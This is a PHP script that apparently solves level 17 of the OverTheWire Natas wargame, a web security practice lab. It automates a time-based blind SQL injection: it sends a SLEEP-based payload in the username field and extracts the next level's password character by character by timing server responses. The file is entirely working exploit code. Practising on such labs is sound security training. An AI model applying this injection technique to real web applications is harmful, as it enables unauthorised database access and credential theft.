<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 17;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$seenPassword = "";

while (strlen($seenPassword) < 32) {
    for ($i = 0; $i < strlen($chars); $i++) {
        $start = microtime(1);
        $attempt = $seenPassword . $chars[$i];
        echo 'Trying ' . $attempt . "\n";

        $response = $client->request('POST', $url, [
            'auth' => [$username, $password],
            'form_params' => [
                'username' => 'natas18" AND password LIKE BINARY "' . $attempt . '%" AND SLEEP(1); #',
            ]
        ]);

        $diff = microtime(1) - $start;
        if ($diff > 1) {
            $seenPassword .= $chars[$i];
            break;
        }
    }
}

echo "\n";
echo $seenPassword;
